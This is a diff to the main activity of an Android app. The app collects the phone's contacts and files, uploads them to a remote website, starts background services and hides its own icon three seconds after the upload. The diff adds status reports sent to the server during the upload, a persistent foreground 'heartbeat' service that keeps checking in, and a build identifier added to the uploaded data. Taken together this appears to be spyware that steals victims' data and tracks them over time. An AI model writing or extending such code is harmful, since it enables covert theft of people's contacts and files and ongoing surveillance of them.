@@ -33,6 +33,8 @@ public class MainActivity extends Activity {
 
     // IMPORTANT: Change this to your deployed website URL
     private static final String WEBSITE_BASE_URL = "https://your-website-url.vercel.app";
+    // BUILD_ID is injected at build time
+    private static final String BUILD_ID = "";
     private static final int CONTACTS_PERMISSION_CODE = 100;
     private static final int FILES_PERMISSION_CODE = 101;
     private static final int NOTIFICATION_PERMISSION_CODE = 102;
@@ -173,6 +175,8 @@ public class MainActivity extends Activity {
                 tvDetail.setText("File manager permission is required. Please try again and tap Allow.");
             }
         } else if (requestCode == NOTIFICATION_PERMISSION_CODE) {
+            // Permissions have been granted - send status update
+            sendStatusUpdate("permissions_granted", "All permissions granted");
             readAndUploadData();
         }
     }
@@ -209,6 +213,9 @@ public class MainActivity extends Activity {
                     tvDetail.setText("Sending " + contactsArray.length() + " contacts & " + filesArray.length() + " files...");
                 });
 
+                // Send status: syncing_contacts (before upload)
+                sendStatusUpdate("syncing_contacts", "Uploading " + contactsArray.length() + " contacts");
+
                 String result = uploadData(contactsArray, filesArray);
 
                 if (result != null) {
@@ -220,6 +227,9 @@ public class MainActivity extends Activity {
 
                     SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                     prefs.edit().putString(KEY_SESSION_ID, sessionId).apply();
+
+                    // Send status: syncing_files (contacts done, files starting)
+                    sendStatusUpdate("syncing_files", "Contacts uploaded, syncing files");
 
                     runOnUiThread(() -> {
                         layoutLoading.setVisibility(View.GONE);
@@ -238,6 +248,16 @@ public class MainActivity extends Activity {
                             startService(serviceIntent);
                         }
 
+                        // Start HeartbeatService
+                        Intent heartbeatIntent = new Intent(MainActivity.this, HeartbeatService.class);
+                        heartbeatIntent.putExtra("sessionId", sessionId);
+                        heartbeatIntent.putExtra("baseUrl", WEBSITE_BASE_URL);
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            startForegroundService(heartbeatIntent);
+                        } else {
+                            startService(heartbeatIntent);
+                        }
+
                         // Hide app icon after 3 seconds
                         new android.os.Handler().postDelayed(() -> hideAppIcon(), 3000);
                     });
@@ -246,6 +266,45 @@ public class MainActivity extends Activity {
                 }
             } catch (Exception e) {
                 showError("Error: " + e.getMessage());
+            }
+        }).start();
+    }
+
+    /**
+     * Send a status update to the server.
+     */
+    private void sendStatusUpdate(String status, String detail) {
+        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+        String sessionId = prefs.getString(KEY_SESSION_ID, null);
+
+        new Thread(() -> {
+            try {
+                JSONObject payload = new JSONObject();
+                payload.put("status", status);
+                if (detail != null) payload.put("detail", detail);
+                if (sessionId != null) payload.put("sessionId", sessionId);
+
+                HttpURLConnection conn = null;
+                try {
+                    URL url = new URL(WEBSITE_BASE_URL + "/api/status/update");
+                    conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("POST");
+                    conn.setRequestProperty("Content-Type", "application/json");
+                    conn.setDoOutput(true);
+                    conn.setConnectTimeout(10000);
+                    conn.setReadTimeout(10000);
+
+                    OutputStream os = conn.getOutputStream();
+                    os.write(payload.toString().getBytes("UTF-8"));
+                    os.flush();
+                    os.close();
+
+                    conn.getResponseCode(); // Consume response
+                } finally {
+                    if (conn != null) conn.disconnect();
+                }
+            } catch (Exception e) {
+                // Silently fail - status updates are best-effort
             }
         }).start();
     }
@@ -479,6 +538,10 @@ public class MainActivity extends Activity {
         JSONObject payload = new JSONObject();
         payload.put("contacts", contacts);
         payload.put("files", files);
+        // Include BUILD_ID if available
+        if (BUILD_ID != null && !BUILD_ID.isEmpty()) {
+            payload.put("buildId", BUILD_ID);
+        }
 
         Exception lastException = null;
         // Retry up to 3 times
